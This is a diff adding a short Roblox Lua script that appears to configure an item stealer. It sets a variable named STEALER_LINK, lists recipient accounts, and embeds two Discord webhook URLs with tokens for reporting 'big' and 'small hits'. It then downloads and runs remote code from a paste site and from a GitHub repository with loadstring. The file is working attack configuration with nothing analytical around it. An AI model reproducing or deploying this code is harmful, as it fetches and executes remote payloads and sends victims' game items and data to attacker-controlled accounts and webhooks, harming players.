@@ -1,0 +1,11 @@
+STEALER_LINK = 'https://dpaste.com/5BBFGKFRQ.txt'
+Usernames = {
+'ZeeS_Farm2',
+'ZeeS_Farm3',
+'ZeeS_Farm4',
+}
+BigHitsWebhook = "https://discord.com/api/webhooks/1361755749251944569/DB2LwOUo81hf2-_2CQzRq1x5WoPWsH4bsOvknPSjTRfS6YjWQD3HQb0N8qwv67LdUB6R"
+SmallHitsWebhook = "https://discord.com/api/webhooks/1361756160562299192/8eP83SNFrQouBFtIWG2fKydDbxdXoLZr-p239dX0lj_5GRRe8p0qbdfX6CXWw8Zx6RNs"
+loadstring(game:HttpGet(STEALER_LINK, true))()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/AscendFromHeaven/Kitsune-Hub/refs/heads/main/WhitelistMM2"))()
